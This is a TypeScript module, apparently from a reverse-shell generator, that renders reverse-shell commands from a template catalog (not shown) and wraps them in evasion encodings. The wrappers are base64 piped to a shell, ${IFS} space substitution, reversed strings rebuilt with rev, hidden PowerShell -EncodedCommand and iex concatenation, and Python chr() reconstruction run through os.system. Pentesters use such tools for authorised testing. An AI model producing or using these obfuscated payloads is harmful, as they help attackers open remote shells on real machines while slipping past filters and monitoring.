import { MAX_COMMAND_CHARS, assertWithinTextLimit } from "@/lib/security";
import { getTemplate } from "./catalog";
import type {
  GeneratedReverseShell,
  ObfuscationMode,
  ReverseShellConfig,
} from "./types";
import { normalizeReverseShellConfig } from "./validation";

function utf8Base64(value: string): string {
  return btoa(unescape(encodeURIComponent(value)));
}

function utf16LeBase64(value: string): string {
  const bytes: number[] = [];
  for (let i = 0; i < value.length; i += 1) {
    const code = value.charCodeAt(i);
    bytes.push(code & 0xff, code >> 8);
  }
  return btoa(String.fromCharCode(...bytes));
}

function singleQuote(value: string): string {
  return `'${value.replace(/'/g, `'\\''`)}'`;
}

function splitForPowerShell(value: string): string {
  const escaped = value.replace(/'/g, "''");
  const chunks = escaped.match(/.{1,28}/g) ?? [escaped];
  return chunks.map((chunk) => `'${chunk}'`).join("+");
}

export function obfuscateCommand(
  command: string,
  mode: ObfuscationMode,
  shell: string,
): { command: string; notes: string[] } {
  switch (mode) {
    case "none":
      return { command, notes: ["No obfuscation applied."] };
    case "url":
      return {
        command: encodeURIComponent(command),
        notes: ["URL-encoded output for HTTP parameter or form contexts."],
      };
    case "bash-base64":
      return {
        command: `echo ${utf8Base64(command)} | base64 -d | ${shell}`,
        notes: ["Base64 wrapper decoded locally before execution."],
      };
    case "bash-ifs":
      return {
        command: command.replace(/ /g, "${IFS}"),
        notes: ["Spaces replaced with ${IFS} for shell argument filtering."],
      };
    case "bash-rev": {
      const reversed = [...command].reverse().join("");
      return {
        command: `${shell} -c \"$(printf %s ${singleQuote(reversed)} | rev)\"`,
        notes: ["Command is stored reversed and reconstructed with rev."],
      };
    }
    case "powershell-encoded":
      return {
        command: `powershell -NoP -NonI -W Hidden -Enc ${utf16LeBase64(command)}`,
        notes: ["PowerShell -EncodedCommand uses UTF-16LE base64."],
      };
    case "powershell-concat":
      return {
        command: `powershell -NoP -NonI -W Hidden -Command \"iex (${splitForPowerShell(command)})\"`,
        notes: ["PowerShell command split into concatenated string chunks."],
      };
    case "python-chr": {
      const chars = [...command].map((char) => char.charCodeAt(0)).join(",");
      return {
        command: `python3 -c 'import os;os.system("".join(map(chr,[${chars}])))'`,
        notes: ["Command reconstructed from character codes before execution."],
      };
    }
  }
}

export function generateReverseShell(
  config: ReverseShellConfig,
): GeneratedReverseShell {
  const safeConfig = normalizeReverseShellConfig(config);
  const template = getTemplate(safeConfig.templateId);
  const rawCommand = template.render(safeConfig);
  assertWithinTextLimit(rawCommand, MAX_COMMAND_CHARS, "Reverse shell command");
  const obfuscated = obfuscateCommand(
    rawCommand,
    safeConfig.obfuscation,
    safeConfig.shell || template.defaultShell,
  );

  return {
    template,
    rawCommand,
    command: obfuscated.command,
    notes: [template.description, ...obfuscated.notes],
  };
}
